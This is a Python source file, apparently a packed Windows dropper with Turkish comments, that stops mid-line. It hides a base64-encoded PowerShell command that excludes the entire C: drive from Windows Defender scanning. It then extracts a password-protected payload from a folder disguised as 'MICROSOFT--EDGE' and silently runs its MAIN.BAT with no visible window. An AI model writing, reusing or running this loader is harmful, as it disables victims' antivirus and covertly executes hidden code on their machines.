import shutil, os, sys, subprocess, pyzipper, ctypes
import hashlib

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def xor_encrypt_decrypt(data, key):
    key_len = len(key)
    return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

def generate_key(password):
    # SHA-256 hash kullanarak güçlü bir anahtar oluştur
    return hashlib.sha256(password.encode()).digest()

def run_powershell_command():
    commands = [
        "powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAA=="
    ]
    ps_command = "; ".join(commands)
    subprocess.run(["powershell", "-Command", ps_command], creationflags=subprocess.CREATE_NO_WINDOW)

def process_files(src, dst, zip_password):
    print(f"Processing files from {src} to {dst}")
    if os.path.exists(dst):
        print(f"Destination {dst} exists. Removing it.")
        shutil.rmtree(dst, ignore_errors=True)

    try:
        shutil.copytree(src, dst)
        zip_path = os.path.join(dst, f"{os.path.basename(src)}.zip")
        extract_path = dst

        if os.path.exists(zip_path):
            print(f"Found zip file at {zip_path}. Extracting...")
            with pyzipper.AESZipFile(zip_path) as zf:
                zf.extractall(path=extract_path, pwd=zip_password)
            os.remove(zip_path)
            print(f"Extracted and deleted {zip_path}")
        else:
            print(f"File {zip_path} does not exist")

        batch_file_path = os.path.join(dst, 'MAIN.BAT')
        if os.path.exists(batch_file_path):
            print(f"Running batch file {batch_file_path}")
            subprocess.run(["cmd.exe", "/c", batch_file_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            print(f"Batch file {batch_file_path} does not exist")

    except Exception as e:
        print(f"An error occurred: {e}")

# Anahtar için güçlü bir şifreleme metodu
password = '72222'
key = generate_key(password)

# Şifreli dosya işlemleri
src1 = resource_path('MICROSOFT--EDGE')
dst1 =
